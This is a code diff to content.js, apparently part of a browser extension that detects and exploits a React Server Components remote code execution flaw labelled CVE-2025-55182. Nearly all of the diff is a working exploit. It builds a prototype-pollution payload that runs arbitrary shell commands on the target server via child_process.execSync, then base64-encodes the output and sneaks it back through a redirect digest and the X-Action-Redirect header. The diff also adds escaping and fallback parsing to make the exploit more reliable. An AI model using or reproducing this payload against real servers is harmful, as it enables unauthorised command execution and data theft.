@@ -1,5 +1,27 @@
 // content.js - RSC detection and exploitation
 
+// === Constants ===
+const REDIRECT_PREFIX = "NEXT_REDIRECT";
+const DEFAULT_PATH = "/";
+
+// === Shell Escape Helper ===
+// Escapes a string for safe use in shell commands (single-quoted context)
+function escapeShellArg(str) {
+    if (!str) return "''";
+    // Replace single quotes with '\'' (end quote, escaped quote, start quote)
+    return "'" + str.replace(/'/g, "'\\''") + "'";
+}
+
+// Escapes for JSON string embedding
+function escapeForJson(str) {
+    return str
+        .replace(/\\/g, '\\\\')
+        .replace(/"/g, '\\"')
+        .replace(/\n/g, '\\n')
+        .replace(/\r/g, '\\r')
+        .replace(/\t/g, '\\t');
+}
+
 // === 1. Passive Detection ===
 function performPassiveScan() {
     let score = 0;
@@ -77,10 +99,35 @@ async function performFingerprint() {
 // === 3. RCE Exploitation (CVE-2025-55182) ===
 async function performExploit(cmd, targetPath) {
     const targetCmd = cmd || "echo vulnerability_test";
-    const targetUrl = targetPath || "/adfa";
+    const targetUrl = targetPath || DEFAULT_PATH;
 
-    // Build payload with prototype pollution
-    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
+    // Properly escape command for shell execution
+    // The command will be wrapped in single quotes, so escape single quotes
+    const escapedCmd = targetCmd.replace(/'/g, "'\\''");
+
+    // Build the JavaScript payload that will execute on the server
+    // Uses base64 encoding and X-Action-Redirect for output exfiltration (matches CLI)
+    const prefixCode =
+        `var res=process.mainModule.require('child_process').execSync('${escapedCmd}')` +
+        `.toString().trim();var encoded=Buffer.from(res).toString('base64');` +
+        `throw Object.assign(new Error('${REDIRECT_PREFIX}'),` +
+        `{digest:'${REDIRECT_PREFIX};push;/login?a='+encoded+';307;'});`;
+
+    // Build payload object and serialize with proper JSON escaping
+    const payloadObj = {
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": "{\"then\":\"$B1337\"}",
+        "_response": {
+            "_prefix": prefixCode,
+            "_chunks": "$Q2",
+            "_formData": {
+                "get": "$1:constructor:constructor"
+            }
+        }
+    };
+    const payloadJson = JSON.stringify(payloadObj);
 
     const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
     const bodyParts = [
@@ -105,15 +152,11 @@ async function performExploit(cmd, targetPath) {
             method: 'POST',
             headers: {
                 'Next-Action': 'x',
-                'X-Nextjs-Request-Id': '7a3f9c1e',
-                'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
-                'Content-Type': `multipart/form-data; boundary=${boundary}`,
-                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
+                'Content-Type': `multipart/form-data; boundary=${boundary}`
             },
             body: bodyParts
         });
 
-        const responseText = await res.text();
         const statusCode = res.status;
 
         // Check for common error conditions
@@ -144,15 +187,46 @@ async function performExploit(cmd, targetPath) {
             };
         }
 
-        // Extract digest value from response
+        // Primary extraction: X-Action-Redirect header (matches CLI behavior)
+        const redirectHeader = res.headers.get('X-Action-Redirect') || '';
+        const headerMatch = redirectHeader.match(/\/login\?a=([^;]+)/);
+
+        if (headerMatch && headerMatch[1]) {
+            try {
+                const decoded = atob(decodeURIComponent(headerMatch[1]));
+                return {
+                    success: true,
+                    output: decoded,
+                    path: targetUrl,
+                    command: targetCmd
+                };
+            } catch (decodeError) {
+                // Fall through to body extraction
+            }
+        }
+
+        // Fallback: Extract from response body digest field
+        const responseText = await res.text();
         const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
 
         if (digestMatch && digestMatch[1]) {
-            let rawBase64 = digestMatch[1];
+            let rawValue = digestMatch[1];
 
             try {
-                // Decode JSON escapes, then Base64
-                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
+                // Check if it's the redirect format
+                const redirectMatch = rawValue.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);/);
+                if (redirectMatch) {
+                    const decoded = atob(decodeURIComponent(redirectMatch[1]));
+                    return {
+                        success: true,
+                        output: decoded,
+                        path: targetUrl,
+                        command: targetCmd
+                    };
+                }
+
+                // Try direct base64 decode
+                let cleanBase64 = JSON.parse(`"${rawValue}"`);
                 const decodedStr = new TextDecoder().decode(
                     Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                 );
@@ -168,28 +242,28 @@ async function performExploit(cmd, targetPath) {
                     success: false,
                     msg: "Decoding error: " + parseError.message,
                     errorType: "decode_error",
-                    debug: rawBase64.substring(0, 50)
+                    debug: rawValue.substring(0, 50)
                 };
             }
-        } else {
-            // Check if response contains indicators of non-vulnerable app
-            if (responseText.includes("<!DOCTYPE") || responseText.includes("<html")) {
-                return {
-                    success: false,
-                    msg: "Target returned HTML - likely not vulnerable",
-                    errorType: "not_vulnerable",
-                    suggestion: "This doesn't appear to be a vulnerable RSC endpoint"
-                };
-            }
+        }
 
+        // Check if response contains indicators of non-vulnerable app
+        if (responseText.includes("<!DOCTYPE") || responseText.includes("<html")) {
             return {
                 success: false,
-                msg: "Exploit failed: 'digest' key not found in response",
-                errorType: "no_digest",
-                debug: responseText.substring(0, 200),
-                statusCode: statusCode
+                msg: "Target returned HTML - likely not vulnerable",
+                errorType: "not_vulnerable",
+                suggestion: "This doesn't appear to be a vulnerable RSC endpoint"
             };
         }
+
+        return {
+            success: false,
+            msg: "Exploit failed: No output found in response",
+            errorType: "no_output",
+            debug: responseText.substring(0, 200),
+            statusCode: statusCode
+        };
 
     } catch (e) {
         // Categorize network errors
